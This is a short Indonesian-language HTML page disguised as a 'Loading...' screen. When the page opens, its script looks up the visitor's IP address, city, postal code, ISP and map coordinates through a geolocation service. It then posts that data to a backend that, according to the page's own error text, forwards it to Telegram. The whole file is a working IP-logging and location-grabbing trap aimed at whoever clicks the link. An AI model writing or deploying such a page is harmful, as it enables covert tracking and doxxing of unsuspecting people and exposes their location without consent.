<!DOCTYPE html>
<html lang="id">
<head>
  <meta charset="UTF-8" />
  <title>Loading...</title>
</head>
<body>
  <h3 id="status">Mohon tunggu...</h3>
  <pre id="result"></pre>
  <script>
    async function getIP() {
      try {
        const res = await fetch("https://ipapi.co/json/");
        const data = await res.json();
        const info = `
📡 IP Terdeteksi
🌐 IP: ${data.ip}
🌍 Negara: ${data.country_name}
🏙 Kota: ${data.city}, ${data.region} ${data.postal}
🛰 ISP: ${data.org}
⌚ Zona Waktu: ${data.timezone}
📌 Koordinat: ${data.latitude}, ${data.longitude}
🔗 https://www.google.com/maps?q=${data.latitude},${data.longitude}
`;
        document.getElementById("status").textContent = "✅ Data berhasil diambil";
        document.getElementById("result").textContent = info;

        const response = await fetch("/api/send", {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({ text: info })
        });
        const result = await response.json();
        console.log("Respon dari API:", result);

        if (!result.ok) {
          document.getElementById("status").textContent = "❌ Gagal kirim ke Telegram";
        }
      } catch (err) {
        console.error("Error:", err);
        document.getElementById("status").textContent = "❌ Terjadi kesalahan";
      }
    }
    getIP();
  </script>
</body>
</html>
